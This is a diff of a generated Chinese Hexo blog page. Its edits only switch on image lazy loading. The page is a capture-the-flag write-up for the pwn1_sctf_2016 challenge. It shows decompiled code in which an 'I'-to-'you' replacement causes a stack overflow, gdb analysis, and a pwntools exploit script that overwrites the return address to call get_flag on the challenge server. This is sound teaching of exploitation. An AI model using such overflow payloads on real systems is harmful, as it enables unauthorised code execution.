@@ -21,7 +21,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
     KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
@@ -218,21 +218,51 @@
         
 
         <div class="article-content markdown-body">
-            <h2 id="获取程序信息"><a href="#获取程序信息" class="headerlink" title="获取程序信息"></a>获取程序信息</h2><p><img src="/images/image-20210919111502225.png" alt="image-20210919111502225"></p>
+            <h2 id="获取程序信息"><a href="#获取程序信息" class="headerlink" title="获取程序信息"></a>获取程序信息</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210919111502225.png"
+                      alt="image-20210919111502225"
+                ></p>
 <p>NX被打开，没有canary保护栈。</p>
-<p><img src="/images/image-20210919111544335.png" alt="image-20210919111544335"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210919111544335.png"
+                      alt="image-20210919111544335"
+                ></p>
 <p>调用一下是这样子的</p>
-<h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><p><img src="/images/image-20210919111656180.png" alt="image-20210919111656180"></p>
+<h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210919111656180.png"
+                      alt="image-20210919111656180"
+                ></p>
 <p>main函数执行了vuln然后看到有get_flag，应该就是在vuln发生栈溢出然后调用get_flag。</p>
 <p>vuln函数的内容:</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+4Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, &amp;s);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(&amp;v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(&amp;v6, <span class="string">&quot;I&quot;</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)&amp;v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, &amp;v3, &amp;v6, &amp;v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;v6);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;v4);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>发现看不懂，完全不知道啥意思，但是可以看到，&amp;s只允许输入32字节的长度，但是栈的情况</p>
-<h2 id="gdb动态分析"><a href="#gdb动态分析" class="headerlink" title="gdb动态分析"></a>gdb动态分析</h2><p><img src="/images/image-20210919112152298.png" alt="image-20210919112152298"></p>
+<h2 id="gdb动态分析"><a href="#gdb动态分析" class="headerlink" title="gdb动态分析"></a>gdb动态分析</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210919112152298.png"
+                      alt="image-20210919112152298"
+                ></p>
 <p>偏移量是64字节，所以无论怎样都无法溢出，然后看见有一个”I”和一个”you”。作为web出生的选手一下子就想到了反序列化因为替换字符导致绕过，这里估计也是一样，然后gdb调式验证一下。</p>
-<p><img src="/images/image-20210919112502055.png" alt="image-20210919112502055"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210919112502055.png"
+                      alt="image-20210919112502055"
+                ></p>
 <p>在这里输入五个”I”</p>
-<p><img src="/images/image-20210919112631422.png" alt="image-20210919112631422"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20210919112631422.png"
+                      alt="image-20210919112631422"
+                ></p>
 <p>可以看到printf答应出来的都是’youyouyouyouyou’了，在栈上也是一样的，变成了五个”you”，从一个字节变到三个字节，找到栈溢出了。</p>
 <h2 id="get-flag"><a href="#get-flag" class="headerlink" title="get_flag"></a>get_flag</h2><p>exp.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;Linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./questions/pwn1_sctf_2016&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29915</span>)</span><br><span class="line">flag_addr = elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*(<span class="number">21</span>)+<span class="string">b&#x27;a&#x27;</span> + p32(flag_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(&#x27;Tell me something about yourself:&#x27;)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
@@ -538,6 +568,8 @@
     <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
 
 
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
 
 
 <div class="post-scripts">
